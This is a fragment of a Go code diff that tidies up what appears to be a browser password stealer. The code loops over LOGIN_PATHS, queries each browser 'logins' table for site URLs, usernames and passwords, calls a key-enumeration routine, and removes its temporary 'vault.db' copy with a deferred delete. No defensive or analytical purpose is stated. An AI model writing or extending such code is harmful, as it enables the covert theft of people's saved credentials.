@@ -111,14 +111,10 @@ func enumKeys() {
 }
 
 func main() {
-	defer func() {
-		os.Remove("vault.db")
-
-	}()
-
+	defer os.Remove("vault.db")
 	enumKeys()
-	for index, path := range LOGIN_PATHS {
 
+	for index, path := range LOGIN_PATHS {
 		rows := queryDB(path, "SELECT origin_url, username_value, password_value FROM logins;")
 		if rows == nil {
 			continue
